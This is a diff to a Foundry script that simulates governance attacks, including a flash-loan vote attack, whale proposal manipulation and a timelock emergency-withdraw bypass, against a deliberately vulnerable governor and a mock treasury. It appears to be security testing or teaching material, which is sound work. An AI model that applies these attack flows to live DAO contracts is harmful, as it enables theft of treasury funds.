@@ -2,6 +2,7 @@
 pragma solidity ^0.8.20;
 
 import {Script} from "forge-std/Script.sol";
+import {StdCheats} from "forge-std/StdCheats.sol";
 import {console} from "forge-std/console.sol";
 
 // Attack Contracts
@@ -19,7 +20,7 @@ import {GovernorVulnerable} from "../src/governance/GovernorVulnerable.sol";
  * @title SimulateAttacks
  * @dev Foundry script to run all 5 attack simulations
  */
-contract SimulateAttacks is Script {
+contract SimulateAttacks is Script, StdCheats {
     // State
     struct AttackResult {
         string attackName;
@@ -32,7 +33,7 @@ contract SimulateAttacks is Script {
 
     // Configuration
     address public constant DEPLOYER = address(0x1);
-    uint256 private constant FLASH_LOAN_AMOUNT = 500_000_000e18;
+    uint256 private constant FLASH_LOAN_AMOUNT = 250_000_000e18;
     uint256 private constant HALF_TREASURY = 5_000_000e18;
     uint256 private constant WHALE_ATTACK_DRAIN = 1_000_000e18;
     uint256 private constant WHALE_TOKENS_TARGET = 600_000_000e18;
@@ -90,6 +91,11 @@ contract SimulateAttacks is Script {
         address flashLoanProvider
     ) internal {
         FlashLoanAttack attack = new FlashLoanAttack(flashLoanProvider, govToken, governor, mockTreasury);
+
+        // Fund the attack contract with fee amount so it can repay the flash loan
+        uint256 fee = attack.getAttackCost(FLASH_LOAN_AMOUNT);
+        deal(govToken, address(attack), fee);
+
         console.log("Executing attack...");
 
         bool success = false;
@@ -119,47 +125,37 @@ contract SimulateAttacks is Script {
 
     function _simulateWhaleManipulation(address govToken, address governor, address mockTreasury) internal {
         console.log("[2] Whale Manipulation");
-        WhaleManipulation attack = new WhaleManipulation(govToken, governor, mockTreasury);
         GovernorVulnerable gov = GovernorVulnerable(payable(governor));
         address whale = msg.sender;
 
         GovernanceToken token = GovernanceToken(govToken);
-        uint256 deployerBalance = token.balanceOf(msg.sender);
-        if (deployerBalance == 0) {
-            results.push(
-                AttackResult({
-                    attackName: "Whale Manipulation",
-                    succeeded: false,
-                    amountExtracted: 0,
-                    details: "Skipped: sender has no governance tokens"
-                })
-            );
-            console.log("SKIP: Whale Manipulation (sender has no governance tokens)");
-            return;
-        }
+        deal(govToken, whale, 500_000_000e18);
+        console.log("Selected whale attacker:", whale);
 
-        uint256 whaleFunding = deployerBalance >= WHALE_TOKENS_TARGET ? WHALE_TOKENS_TARGET : deployerBalance;
+        vm.startPrank(whale);
+        WhaleManipulation attack = new WhaleManipulation(govToken, governor, mockTreasury);
 
-        // If the broadcaster already holds tokens, no transfer is required.
-        if (whaleFunding < deployerBalance) {
-            require(token.transfer(whale, whaleFunding), "transfer to whale failed");
-        }
-        token.delegate(whale);
-
-        console.log("Created whale with voting power: ", whaleFunding);
+        // Ensure delegates are set to themselves
+        token.selfDelegate();
+        vm.roll(block.number + 1);
+        console.log("Created whale with voting power: ", token.getVotes(whale));
 
         uint256 proposalId = 0;
         try attack.createWhaleProposal(whale, WHALE_ATTACK_DRAIN) returns (uint256 id) {
             proposalId = id;
         } catch {
-            console.log("Whale proposal blocked");
+            console.log("Whale proposal blocked by governor rules");
         }
 
         console.log("Created whale proposal ID: ", proposalId);
 
         if (proposalId != 0) {
-            // Move from Pending to Active.
-            if (gov.votingDelay() > 0) vm.roll(block.number + gov.votingDelay() + 1);
+            (uint256 voteStart, uint256 voteEnd) = gov.proposalSnapshot(proposalId);
+
+            // Move to Active State by rolling exactly to voteStart (not past voteEnd).
+            if (block.number < voteStart) {
+                vm.roll(voteStart);
+            }
 
             // Whale votes directly on governor so voting weight is attributed correctly.
             try gov.castVote(proposalId, 1) returns (uint256 weight) {
@@ -169,15 +165,20 @@ contract SimulateAttacks is Script {
             }
 
             // Move beyond voting period so proposal can be evaluated/executed.
-            if (gov.votingPeriod() > 0) vm.roll(block.number + gov.votingPeriod() + 1);
+            vm.roll(voteEnd + 1);
+            vm.warp(block.timestamp + 10 days); // Also warp time to satisfy any timelocks if present
+
+            console.log("Proposal state before execution: ", uint256(gov.state(proposalId)));
         }
 
         bool success = false;
         try attack.executeAfterWhaleVote(proposalId) returns (bool res) {
             success = res;
         } catch {
-            console.log("Whale execution blocked");
+            console.log("Whale vote blocked by governor rules");
         }
+        vm.stopPrank();
+
         console.log("Attack execution result: ", success);
         uint256 stolenAmount = attack.getAmountStolen();
         bool succeeded = attack.wasAttackSuccessful();
@@ -255,6 +256,20 @@ contract SimulateAttacks is Script {
         console.log("[5] Timelock Exploit");
         address timelock =
             vm.envExists("TIMELOCK_ADDRESS") ? vm.envAddress("TIMELOCK_ADDRESS") : vm.envAddress("TIMELOCK");
+
+        if (timelock == address(0)) {
+            console.log("No timelock configured, skipping attack.");
+            results.push(
+                AttackResult({
+                    attackName: "Timelock Exploit",
+                    succeeded: false,
+                    amountExtracted: 0,
+                    details: "Skipped - no timelock"
+                })
+            );
+            return;
+        }
+
         TimelockExploit attack = new TimelockExploit(governor, timelock, mockTreasury);
         console.log("Identifying timelock vulnerabilities...");
         uint256 delay = attack.identifyTimelockVulnerabilities();
@@ -263,7 +278,7 @@ contract SimulateAttacks is Script {
         bool success = false;
         bool succeeded = false;
         uint256 stolen = 0;
-        try attack.executeEmergencyFunctionBypass("emergencyWithdraw", 100_000e18) returns (bool res) {
+        try attack.executeEmergencyFunctionBypass("emergencyWithdraw()", 100_000e18) returns (bool res) {
             success = res;
             succeeded = attack.wasAttackSuccessful();
             stolen = attack.getAmountStolen();
@@ -417,3 +432,4 @@ contract SimulateAttacks is Script {
         return results;
     }
 }
+
